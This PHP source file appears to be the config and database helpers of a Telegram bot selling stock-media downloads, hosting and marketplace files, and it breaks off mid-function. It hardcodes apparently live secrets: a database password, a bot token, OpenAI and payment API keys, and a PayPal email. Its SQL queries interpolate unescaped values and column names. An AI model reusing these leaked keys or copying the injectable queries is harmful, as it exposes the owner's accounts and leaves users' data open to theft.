<?php
date_default_timezone_set('Asia/Tehran');
error_reporting(0);
global $db;
define('SQL', array('host' => 'localhost', 'username' => 'nstockon_root', 'password' => 'kyDpNeXT-hCW', 'database' => 'nstockon_stock'));
$db = mysqli_connect(SQL['host'], SQL['username'], SQL['password'], SQL['database']);
mysqli_query($db, "SET NAMES 'utf8mb4'");
mysqli_query($db, "SET CHARACTER SET utf8mb4");
mysqli_query($db, "SET SESSION collation_connection = 'utf8mb4_unicode_ci'");

define('API_KEY', '2003652111:AAEWnlldJPLSx97hruNoI-573ATEoCuKRQ0');
define('POST_CHANNEL', '-1001387364888');
define('WHM_KEY', 'BigDickSYRE');
define('GS_MONTH', array('1' => '10', '3' => '25', '6' => '45', 'FREE' => '1'));
define('PREMIUM_PRICE', array('1' => '1', '3' => '3', '6' => '6'));
define('HOST_MONTH', array('1' => '3'));
define('PER_MIN', '100');
define('SHARED_EXPIRE', MONTHS(1));
define('BUILD_VERSION', '4.5');
define('SELLERS_CATEGORIES_SW', array('PSD Mockup', 'Image / Vector', 'Web Themes & Templates', 'Code', 'Video', 'Audio', '3D Files', 'Fonts', 'Tools'));
define('SELLERS_CATEGORIES_HW', array('Computer Case', 'Power Supply', 'Keyboard', 'Wireless Mouse', 'Wired Mouse', 'Wired Headset', 'Game Controller', 'Mouse Pads', 'Cool Pads', 'Cooling Fan', 'Wired Speaker'));
define('PAY_API', 'A58e5XHVk4Tn3PplrHJnYZ1ugsSgkFneWvo9o0gTb12j6ibCKI');
define('PAY_KEY', 'gg123');
#define('OPENAI_KEY', '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');
define('OPENAI_KEY', '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');
define('PAYPAL_URL', 'https://www.paypal.com/cgi-bin/webscr');
define('PAYPAL_SANDBOX_URL', 'https://www.sandbox.paypal.com/cgi-bin/webscr');
define('PAYPAL_EMAIL', 'kotwalmustak@gmail.com');

define('GS_API', 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvZ2V0c3RvY2tzLm5ldFwvYXBpXC9hdXRoXC9sb2dpbiIsImlhdCI6MTY4MDkzNjA0MSwibmJmIjoxNjgwOTM2MDQxLCJqdGkiOiJoUWFaYk41VUEyaEJlb3BBIiwic3ViIjoyNjUyLCJwcnYiOiIyM2JkNWM4OTQ5ZjYwMGFkYjM5ZTcwMWM0MDA4NzJkYjdhNTk3NmY3In0.bJNRqGt-6dp_xoE3TzIERRcSZfm7h-cYqtmIr4zXREA');

define('PREMIUM_PRIZE', array('1' => array('need' => '20', 'prize' => '1'), '2' => array('need' => '1', 'prize' => '0.03'), '3' => array('need' => '2000', 'prize' => '0.2'), '4' => array('need' => '1', 'prize' => '0.5'), '5' => array('need' => '3', 'prize' => '0.5'), '6' => array('need' => '1', 'prize' => '0.3')));

define('SECRET_CHANNEL_CODE', '1541381666');

//createTables();

if(!is_file('sendtoall.json')) {
    file_put_contents('sendtoall.json', json_encode(['list'=>[]]));
}
$getall = json_decode(file_get_contents('sendtoall.json'), true);

function sendQuery($query) {
    global $db;
    $res = mysqli_query($db, $query);
    return $res;
}
function makeAntiInjection($str) {
    global $db;
    $str = strip_tags(mysqli_real_escape_string($db, $str));
    return $str;
}
function getProduct($name, $col) {
	global $db;
	if(isProductExist($name)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `products` WHERE `name` = '$name'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setProduct($name, $col, $val) {
	if(isProductExist($name)) {
		sendQuery("UPDATE `products` SET `$col` = '$val' WHERE `name` = '$name'");
		return true;
	}
	return false;
}
function getFootage($name, $col) {
	global $db;
	if(isFootageExist($name)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `footage` WHERE `name` = '$name'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setFootage($name, $col, $val) {
	if(isFootageExist($name)) {
		sendQuery("UPDATE `footage` SET `$col` = '$val' WHERE `name` = '$name'");
		return true;
	}
	return false;
}
function getShared($name, $col) {
	global $db;
	if(isSharedExist($name)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `shared` WHERE `name` = '$name'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function getNumber($name, $col) {
	global $db;
	if(isNumberExist($name)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `numbers` WHERE `name` = '$name'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function getCredit($domain, $col) {
	global $db;
	if(isCreditExist($domain)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `credits` WHERE `domain` = '$domain'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function getDiscount($code, $col) {
    $code = str_replace('-', '', $code);
	global $db;
	if(isDiscountExist($code)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `discounts` WHERE `code` = '$code'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setDiscount($code, $col, $val) {
    $code = str_replace('-', '', $code);
	if(isDiscountExist($code)) {
		sendQuery("UPDATE `discounts` SET `$col` = '$val' WHERE `code` = '$code'");
		return true;
	}
	return false;
}
function getAccount($email, $col) {
	global $db;
	if(isAccountExist($email)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `accounts` WHERE `email` = '$email'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setAccount($email, $col, $val) {
	if(isAccountExist($email)) {
		sendQuery("UPDATE `accounts` SET `$col` = '$val' WHERE `email` = '$email'");
		return true;
	}
	return false;
}
function isChatVIP($chat_id) {
    $vip = getChats($chat_id, 'vip');
    if($vip > '0') {
        return true;
    }
    return false;
}
function getChats($chat_id, $col) {
	global $db;
	if(isChatExist($chat_id)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `chats` WHERE `chat_id` = '$chat_id'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setChats($chat_id, $col, $val) {
	if(isChatExist($chat_id)) {
		sendQuery("UPDATE `chats` SET `$col` = '$val' WHERE `chat_id` = '$chat_id'");
		return true;
	}
	return false;
}
function setCredit($domain, $col, $val) {
	if(isCreditExist($domain)) {
		sendQuery("UPDATE `credits` SET `$col` = '$val' WHERE `domain` = '$domain'");
		return true;
	}
	return false;
}
function getPopularity($value, $type) {
    $result = "null";
    if($type == '1') {
        if($value < 20) {
            $result = "Newbie";
        }
        elseif($value >= 20 && $value < 50) {
            $result = "Artist";
        }
        elseif($value >= 50) {
            $result = "Popular Artist";
        }
    }
    elseif($type == '2') {
        if($value < 20) {
            $result = "Newbie";
        }
        elseif($value >= 20 && $value < 50) {
            $result = "Seller";
        }
        elseif($value >= 50) {
            $result = "Popular Seller";
        }
    }
    return $result;
}
function isUserBoughtVFile($user_id, $id) {
    global $db;
    $res = mysqli_query($db, "SELECT * FROM `sellers_bought` WHERE `user_id` = '$user_id' AND `s_id` = '$id'");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
        return true;
    }
    return false;
}
function createLicense($id, $buy) {
    $bot_name = bot('getMe')->result->first_name;
    $bot_username = bot('getMe')->result->username;
    $bot_name_ex = strtolower($bot_name);
    $user_id = getVFile($id, 'user_id');
    $name = getVFile($id, 'name');
    $chat_id = getVFile($id, 'chat_id');
    $message_id = getVFile($id, 'message_id');
    $license = getVFile($id, 'license');
    $username = bot('getChat', array('chat_id' => $chat_id))->result->username;
    $item_url = "https://t.me/$username/$message_id";
    $rec_name = getVFileName($id);
    $user_name = bot('getChat', array('chat_id' => $user_id))->result->first_name;
    if(strlen($user_name) < 2) {
        $user_name = $user_id;
    }
    $year = date('Y');
    $fulldate = date('Y-m-d');
    $support = "https://t.me/$bot_username";
    $result = "LICENSE CERTIFICATE: $bot_name\n=================================================\nThis license certificate documents a license to use the item listed below\non a non-exclusive, commercial, worldwide and revokable basis, for\none Single Use for this Registered Project.\n\nItem Title:                      $name\nItem URL:                        $item_url\nItem ID:                         $rec_name\nAuthor Name:                     $user_name\nLicense:                         $buy\nRegistered Project Name:         $bot_name_ex\nLicense Date:                    $fulldate\nItem License Code:               $license\n\nThe license you hold for this item is only valid if you complete your End\nProduct while your subscription is active. Then the license continues\nfor the life of the End Product (even if your subscription ends).\n\nFor any queries related to this document or license please contact\n$bot_name Support via $support\n\n$bot_name ($year)\n==== THIS IS NOT A TAX RECEIPT OR INVOICE ====";
    return $result;
}
function sendVFile($user_id, $id, $again = false) {
    $ret = false;
    $file_id = getVFile($id, 'file_id');
    $type = getVFile($id, 'type');
    $name = getVFile($id, 'name');
    $description = getVFile($id, 'description');
    $price = getVFile($id, 'price');
    $license = getVFile($id, 'license');
    $caption = "<b>- Name:</b> <code>$name</code>\n<b>- Description:</b> <code>$description</code>\n<b>- Price:</b> <code>$price Stock Coins</code>".($again ? " (Paid Before)" : "");
    $info = "";
    $lic = createLicense($id, $user_id);
    $license_file = "$license.txt";
    file_put_contents($license_file, $lic);
    if($type == 'document') {
        $info = sendDocument($user_id, $file_id, $caption);
    }
    elseif($type == 'audio') {
        $info = sendAudio($user_id, $file_id, $caption);
    }
    if($info->ok) {
        $fileName = "$license.zip";
        zipFile($fileName, array("$license_file"));
        $directory = explode('/', getcwd());
        $directory = $directory[sizeof($directory)-1];
        $license_document = "https://".$_SERVER['HTTP_HOST']."/$directory/$fileName";
        sendDocument($user_id, $license_document, "🔻 License File", $info->result->message_id);
        $ret = true;
    }
    unlink($license_file);
    unlink($fileName);
    return $ret;
}
function getVFileCaption($id) {
    $name = getVFile($id, 'name');
    $rec_name = getVFileName($id);
    $description = getVFile($id, 'description');
    $user_id = getVFile($id, 'user_id');
    $mention = mentionUser($user_id);
    $price = getVFile($id, 'price');
    $category = getVFile($id, 'category');
    $ware = getVFile($id, 'ware');
    $whole_downloads = getSellerDownloads($user_id);
    $popularity = getPopularity($whole_downloads, $ware);
    $w = "Software";
    $result = "#MARKET (<b>$w</b>)\n\n<b>* Artist:</b> <code>$mention</code> ($popularity)\n<b>* Category:</b> <code>$category</code>\n<b>* File Name:</b> <code>$name</code> (#$rec_name)\n<b>* Description:</b> <code>$description</code>\n";
    if($ware == '2') {
        $w = "Hardware";
        $result = "#MARKET (<b>$w</b>)\n\n<b>* Seller:</b> <code>$mention</code> ($popularity)\n<b>* Category:</b> <code>$category</code>\n<b>* Name:</b> <code>$name</code> (#$rec_name)\n<b>* Description:</b> <code>$description</code>\n";
    }
    return $result;
}
function getSellerDownloads($user_id) {
    global $db;
    $downloads = 0;
    $arts = array();
    $res = mysqli_query($db, "SELECT * FROM `sellers` WHERE `user_id` = '$user_id'");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
		while($row = mysqli_fetch_assoc($res)) {
		    array_push($arts, $row['id']);
		}
    }
    foreach($arts as $id) {
        $downloads = ($downloads + getVFileDownloads($id));
    }
    return $downloads;
}
function getVFileDownloads($id) {
    global $db;
    $res = mysqli_query($db, "SELECT * FROM `sellers_bought` WHERE `s_id` = '$id'");
    return mysqli_num_rows($res);
}
function getVFileName($id) {
    $bot_name = bot('getMe')->result->first_name;
    return $bot_name."_".sprintf("%09d", $id);
}
function isTCodeExist($code) {
	global $db;
	$query = "SELECT * FROM `transactions` WHERE `orderid` = '$code'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function genTCode() {
    $code = 'T_'.randomString(10);
    if(isTCodeExist($code)) {
        return genTCode();
    }
    return $code;
}
function genAccessKey() {
    $code = randomString(64);
    if(isUserExist(getSecretUser($code, 'id'))) {
        return genAccessKey();
    }
    return $code;
}
function isTransExist($id) {
	global $db;
	$query = "SELECT * FROM `transactions` WHERE `transid` = '$id'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isCreditExist($domain) {
	global $db;
	$query = "SELECT * FROM `credits` WHERE `domain` = '$domain'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function getTrans($id, $col) {
	global $db;
	if(isTransExist($id)) {
    	$res = mysqli_query($db, "SELECT `$col` FROM `transactions` WHERE `transid` = '$id'");
		$res = mysqli_fetch_assoc($res);
	    return $res[$col];
	}
	return false;
}
function setTrans($id, $col, $val) {
	if(isTransExist($id)) {
		sendQuery("UPDATE `transactions` SET `$col` = '$val' WHERE `transid` = '$id'");
		return true;
	}
	return false;
}
function getPayPalPayment($item_number, $col) {
	global $db;
	if(isPayPalPaymentExist($item_number)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `paypalpayments` WHERE `item_number` = '$item_number'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setPayPalPayment($item_number, $col, $val) {
	if(isPayPalPaymentExist($item_number)) {
		sendQuery("UPDATE `paypalpayments` SET `$col` = '$val' WHERE `item_number` = '$item_number'");
		return true;
	}
	return false;
}
function getSecretUser($secret, $col) {
	global $db;
	$res = mysqli_query($db, "SELECT `$col` FROM `users` WHERE `secret` = '$secret'");
	$res = mysqli_fetch_assoc($res);
	return $res[$col];
}
function getUser($user, $col) {
	global $db;
	if(isUserExist($user)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `users` WHERE `id` = '$user'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setUser($user, $col, $val) {
	if(isUserExist($user)) {
		sendQuery("UPDATE `users` SET `$col` = '$val' WHERE `id` = '$user'");
		return true;
	}
	return false;
}
function getHost($id, $col) {
	global $db;
	if(isHostExist($id)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `hosts` WHERE `id` = '$id'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setHost($id, $col, $val) {
	if(isHostExist($id)) {
		sendQuery("UPDATE `hosts` SET `$col` = '$val' WHERE `id` = '$id'");
		return true;
	}
	return false;
}
function getAPI($user, $domain, $col) {
	global $db;
	if(isAPIExist($user, $domain)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `api` WHERE `user_id` = '$user' AND `domain` = '$domain'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setAPI($user, $domain, $col, $val) {
	if(isAPIExist($user, $domain)) {
		sendQuery("UPDATE `api` SET `$col` = '$val' WHERE `user_id` = '$user' AND `domain` = '$domain'");
		return true;
	}
	return false;
}
function getTicket($id, $col) {
	global $db;
	if(isTicketExist($id)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `tickets` WHERE `id` = '$id'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setTicket($id, $col, $val) {
	if(isTicketExist($id)) {
		sendQuery("UPDATE `tickets` SET `$col` = '$val' WHERE `id` = '$id'");
		return true;
	}
	return false;
}
function getFile($link, $col) {
	global $db;
	if(isFileExist($link)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `files` WHERE `link` = '$link'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setFile($link, $col, $val) {
	if(isFileExist($link)) {
		sendQuery("UPDATE `files` SET `$col` = '$val' WHERE `link` = '$link'");
		return true;
	}
	return false;
}
function getVBFile($id, $col) {
	global $db;
	if(isVBFileExist($id)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `sellers_bought` WHERE `id` = '$id'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setVBFile($id, $col, $val) {
	if(isVBFileExist($id)) {
		sendQuery("UPDATE `sellers_bought` SET `$col` = '$val' WHERE `id` = '$id'");
		return true;
	}
	return false;
}
function getVFile($id, $col) {
	global $db;
	if(isVFileExist($id)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `sellers` WHERE `id` = '$id'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setVFile($id, $col, $val) {
	if(isVFileExist($id)) {
		sendQuery("UPDATE `sellers` SET `$col` = '$val' WHERE `id` = '$id'");
		return true;
	}
	return false;
}
function getPost($id, $col) {
	global $db;
	if(isPostExist($id)) {
		$res = mysqli_query($db, "SELECT `$col` FROM `posts` WHERE `id` = '$id'");
		$res = mysqli_fetch_assoc($res);
		return $res[$col];
	}
	return false;
}
function setPost($id, $col, $val) {
	if(isPostExist($id)) {
		sendQuery("UPDATE `posts` SET `$col` = '$val' WHERE `id` = '$id'");
		return true;
	}
	return false;
}
function getUsers() {
    global $db;
    return mysqli_num_rows(mysqli_query($db, "SELECT * FROM `users`"));
}
function getSettings($col) {
	global $db;
	$res = mysqli_query($db, "SELECT `$col` FROM `settings`");
	$res = mysqli_fetch_assoc($res);
	return $res[$col];
}
function setSettings($col, $val) {
	sendQuery("UPDATE `settings` SET `$col` = '$val'");
	return true;
}
function getPayment($id, $col) {
	global $db;
	if(isPaymentExist($id)) {
	    $res = mysqli_query($db, "SELECT `$col` FROM `payments` WHERE `id` = '$id'");
	    $res = mysqli_fetch_assoc($res);
	    return $res[$col];
    }
    return false;
}
function setPayment($id, $col, $val) {
	if(isPaymentExist($id)) {
	    sendQuery("UPDATE `payments` SET `$col` = '$val' WHERE `id` = '$id'");
	    return true;
	}
	return false;
}
function getGSPrice($month) {
    return GS_MONTH["$month"];
}
function isTableExist($table) {
    global $db;
    $res = mysqli_query($db, "SHOW TABLES LIKE '$table'");
    return mysqli_num_rows($res) > 0;
}
function isUserAdmin($user) {
	global $db;
	$query = "SELECT * FROM `users` WHERE `id` = '$user' AND `admin` != '-1'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function getUserAdmin($user) {
    if(isUserExist($user)) {
        return getUser($user, 'admin');
    }
    return -1;
}
function isUserExist($user) {
	global $db;
	$query = "SELECT * FROM `users` WHERE `id` = '$user'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function acceptedArts($user) {
	global $db;
	$query = "SELECT * FROM `sellers` WHERE `user_id` = '$user' AND `status` = '1'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
	return $num;
}
function isQuestUnlocked($user, $quest) {
	global $db;
	$query = "SELECT * FROM `premium_quests` WHERE `user_id` = '$user' AND `quest` = '$quest'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isAnswerExist($id) {
	global $db;
	$query = "SELECT * FROM `answers` WHERE `id` = '$id'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isHostExist($id) {
	global $db;
	$query = "SELECT * FROM `hosts` WHERE `id` = '$id'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isAPIExist($user, $domain) {
	global $db;
	$query = "SELECT * FROM `api` WHERE `user_id` = '$user' AND `domain` = '$domain'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isPayPalPaymentExist($item_number) {
	global $db;
	$query = "SELECT * FROM `paypalpayments` WHERE `item_number` = '$item_number'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isTicketExist($id) {
	global $db;
	$query = "SELECT * FROM `tickets` WHERE `id` = '$id'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isFileExist($link) {
	global $db;
	$query = "SELECT * FROM `files` WHERE `link` = '$link'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isFileIDExist($fid, $link) {
	global $db;
	$query = "SELECT * FROM `files` WHERE `fid` = '$fid' AND `link` = '$link'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isPostExist($id) {
	global $db;
	$query = "SELECT * FROM `posts` WHERE `id` = '$id'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isAccountExist($email) {
	global $db;
	$query = "SELECT * FROM `accounts` WHERE `email` = '$email'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function formatToCode($string) {
    $string = json_encode(str_split($string, 4));
    $string = json_decode($string, true);
    return $string[0]."-".$string[1]."-".$string[2]."-".$string[3];
}
function isDiscountExist($code) {
    $code = str_replace('-', '', $code);
	global $db;
	$query = "SELECT * FROM `discounts` WHERE `code` = '$code'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isDiscountUsable($code) {
    $code = str_replace('-', '', $code);
	global $db;
	$query = "SELECT * FROM `discounts` WHERE `code` = '$code' AND `user` = '-1'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isChatExist($id) {
	global $db;
	$query = "SELECT * FROM `chats` WHERE `chat_id` = '$id'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isVFileExist($id) {
	global $db;
	$query = "SELECT * FROM `sellers` WHERE `id` = '$id'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isLicenseExist($license) {
	global $db;
	$query = "SELECT * FROM `sellers` WHERE `license` = '$license'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isVBFileExist($id) {
	global $db;
	$query = "SELECT * FROM `sellers_bought` WHERE `id` = '$id'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isPaymentExist($id) {
	global $db;
	$query = "SELECT * FROM `payments` WHERE `id` = '$id'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isFind($string, $find) {
    $pos = stripos($string, $find);
    if($pos === false) {
        return false;
    }
    return true;
}
function isValidEmail($email) {
    return filter_var($email, FILTER_VALIDATE_EMAIL);
}
function addUserQuest($user_id, $quest) {
    if(!isQuestUnlocked($user_id, $quest)) {
        $prize = PREMIUM_PRIZE["$quest"]['prize'];
	    sendQuery("INSERT INTO `premium_quests` (`user_id`, `quest`, `prize`, `time`) VALUES ('$user_id', '$quest', '$prize', '".time()."')");
	    return true;
    }
	return false;
}
function addAPILog($user_id, $secret, $link, $balance, $price) {
	sendQuery("INSERT INTO `apilogs` (`user_id`, `secret`, `link`, `balance`, `price`, `ip`, `time`) VALUES ('$user_id', '$secret', '$link', '$balance', '$price', '".getIP()."', '".time()."')");
	return true;
}
function setUserBoughtVFile($user_id, $id) {
    global $db;
	if(!isUserBoughtVFile($user_id, $id)) {
		sendQuery("INSERT INTO `sellers_bought` (`user_id`, `s_id`, `time`) VALUES ('$user_id', '$id', '".time()."')");
		return mysqli_insert_id($db);
	}
	return null;
}
function createUser($user, $ref = -1) {
	if(!isUserExist($user) && !empty($user) && !is_null($user)) {
		sendQuery("INSERT INTO `users` (`id`, `ref`, `regtime`) VALUES ('$user', '$ref', '".time()."')");
		return true;
	}
	return false;
}
function createAPI($user, $domain, $maxuses, $time) {
	if(!isAPIExist($user, $domain)) {
		sendQuery("INSERT INTO `api` (`user_id`, `domain`, `maxuses`, `time`) VALUES ('$user', '$domain', '$maxuses', '$time')");
		return true;
	}
	return false;
}
function createTicket($user, $message) {
    global $db;
	if(isUserExist($user) && !empty($message) && !is_null($message)) {
		sendQuery("INSERT INTO `tickets` (`user_id`, `message`, `time`) VALUES ('$user', '$message', '".time()."')");
		return mysqli_insert_id($db);
	}
	return false;
}
function createPost($ftype, $fid, $link, $addby) {
    global $db;
    if(isUserExist($addby)) {
	    sendQuery("INSERT INTO `posts` (`ftype`, `fid`, `link`, `addby`, `time`) VALUES ('$ftype', '$fid', '$link', '$addby', '".time()."')");
	    return mysqli_insert_id($db);
    }
    return false;
}
function createAccount($type, $email, $username, $password, $fid, $ftype, $addby) {
	if(!isAccountExist($user) && isUserExist($addby) && isUserAdmin($addby)) {
		sendQuery("INSERT INTO `accounts` (`type`, `email`, `username`, `password`, `fid`, `ftype`, `addby`, `time`) VALUES ('$type', '$email', '$username', '$password', '$fid', '$ftype', '$addby', '".time()."')");
		return true;
	}
	return false;
}
function createHosts($user_id, $domain, $username, $ex = 1) {
    $now = time();
    $expire = ($now + MONTHS($ex));
	sendQuery("INSERT INTO `hosts` (`user_id`, `domain`, `username`, `plan`, `time`, `expire`) VALUES ('$user_id', '$domain', '$username', '$ex', '$now', '$expire')");
	return true;
}
function createFile($link, $ftype, $fid, $requester, $addby) {
	if(!isFileIDExist($fid, $link)) {
		sendQuery("INSERT INTO `files` (`link`, `ftype`, `fid`, `requester`, `addby`, `time`) VALUES ('$link', '$ftype', '$fid', '$requester', '$addby', '".time()."')");
		return true;
	}
	return false;
}
function genLicense() {
    $license = randomString(10);
    if(isLicenseExist($license)) {
        return genLicense();
    }
    return $license;
}
function createVFile($user_id, $type, $file_id, $filesize, $ware = 1) {
    global $db;
    $license = genLicense();
	sendQuery("INSERT INTO `sellers` (`user_id`, `type`, `file_id`, `filesize`, `ware`, `license`, `time`) VALUES ('$user_id', '$type', '$file_id', '$filesize', '$ware', '$license', '".time()."')");
	return mysqli_insert_id($db);
}
function isProductExist($name) {
	global $db;
	$query = "SELECT * FROM `products` WHERE `name` = '$name'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isFootageExist($name) {
	global $db;
	$query = "SELECT * FROM `footage` WHERE `name` = '$name'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isSharedExist($name) {
	global $db;
	$query = "SELECT * FROM `shared` WHERE `name` = '$name'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function deleteProduct($name) {
    sendQuery("DELETE FROM `products` WHERE `name` = '$name'");
    return true;
}
function deleteFootage($name) {
    sendQuery("DELETE FROM `footage` WHERE `name` = '$name'");
    return true;
}
function deleteShared($name) {
    sendQuery("DELETE FROM `shared` WHERE `name` = '$name'");
    return true;
}
function deleteNumber($name) {
    sendQuery("DELETE FROM `numbers` WHERE `name` = '$name'");
    return true;
}
function getAPIUses($user_id, $time = 0) {
	global $db;
	$curtime = time();
	if($time > 0) {
	    $max = ($curtime - DAYS($time));
	    $query = "SELECT * FROM `apilogs` WHERE `user_id` = '$user_id' AND `time` >= '$max'";
	}
	else {
	    $query = "SELECT * FROM `apilogs` WHERE `user_id` = '$user_id'";
	}
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    return $num;
}
function getSellersCategories($type = 1) {
    $categories = ($type == 1 ? SELLERS_CATEGORIES_SW : SELLERS_CATEGORIES_HW);
    $keyboard = [];
    foreach($categories as $category) {
        $keyboard[] = ['text' => $category];
    }
    $keyboard[] = ['text' => 'Back'];
    return json_encode(['keyboard' => array_chunk($keyboard, 3), "resize_keyboard" => true, 'one_time_keyboard' => true]);
}
function getProducts() {
    global $db;
    $prods = array();
    $res = mysqli_query($db, "SELECT * FROM `products` ORDER BY `sort` DESC");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
		while($row = mysqli_fetch_assoc($res)) {
		    array_push($prods, $row['name']);
		}
    }
    $keyboard = [];
    foreach($prods as $name) {
        $keyboard[] = ['text' => $name];
    }
    $keyboard[] = ['text' => 'Back'];
    return json_encode(['keyboard' => array_chunk($keyboard, 3), "resize_keyboard" => true, 'one_time_keyboard' => true]);
}
function getFootages() {
    global $db;
    $footages = array();
    $res = mysqli_query($db, "SELECT * FROM `footage` ORDER BY `sort` DESC");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
		while($row = mysqli_fetch_assoc($res)) {
		    array_push($footages, $row['name']);
		}
    }
    $keyboard = [];
    foreach($footages as $name) {
        $keyboard[] = ['text' => $name];
    }
    $keyboard[] = ['text' => 'Back'];
    return json_encode(['keyboard' => array_chunk($keyboard, 3), "resize_keyboard" => true, 'one_time_keyboard' => true]);
}
function getNumbers() {
    global $db;
    $numbers = array();
    $res = mysqli_query($db, "SELECT * FROM `numbers`");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
		while($row = mysqli_fetch_assoc($res)) {
		    array_push($numbers, $row['name']);
		}
    }
    $keyboard = [];
    foreach($numbers as $name) {
        $keyboard[] = ['text' => $name];
    }
    $keyboard[] = ['text' => 'Back'];
    return json_encode(['keyboard' => array_chunk($keyboard, 3), "resize_keyboard" => true, 'one_time_keyboard' => true]);
}
function getShareds() {
    global $db;
    $shareds = array();
    $res = mysqli_query($db, "SELECT * FROM `shared`");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
		while($row = mysqli_fetch_assoc($res)) {
		    array_push($shareds, $row['name']);
		}
    }
    $keyboard = [];
    foreach($shareds as $name) {
        if(isSharedAvailable($name)) {
            $keyboard[] = ['text' => $name];
        }
    }
    $keyboard[] = ['text' => 'Back'];
    return json_encode(['keyboard' => array_chunk($keyboard, 3), "resize_keyboard" => true, 'one_time_keyboard' => true]);
}
function isSharedAvailable($name) {
    global $db;
    $dbid = -1;
    $max = 0;
    $count = 0;
    $shid = array();
    $res = mysqli_query($db, "SELECT * FROM `shared` WHERE `name` = '$name'");
